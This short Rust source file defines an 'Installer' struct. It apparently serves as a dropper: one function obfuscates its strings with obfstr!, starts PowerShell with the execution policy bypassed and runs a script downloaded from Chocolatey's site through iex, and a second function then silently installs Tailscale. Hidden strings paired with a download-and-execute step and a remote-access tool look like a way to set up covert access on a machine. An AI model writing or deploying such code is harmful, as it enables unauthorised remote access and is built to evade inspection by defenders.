use obfstr::obfstr;
use std::process::Command;

pub struct Installer 
{
    pub local: String,
}

impl Installer
{
    pub fn download_choco()
    {
        let log_found = Command::new(obfstr!("powershell.exe"))
            .args([
                obfstr!("-NoProfile"),
                obfstr!("-InputFormat"),
                obfstr!("None"),
                obfstr!("-ExecutionPolicy"),
                obfstr!("Bypass"),
                obfstr!("-Command"),
                obfstr!("[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"),

            ])
            .status()
            .expect("error");
    }
    pub fn download_tailscale()
    {
        let log_ff = Command::new(obfstr!("choco.exe"))
            .args([
                obfstr!("install"),
                obfstr!("tailscale"),
            ])
            .status()
            .expect("error");
    }

}
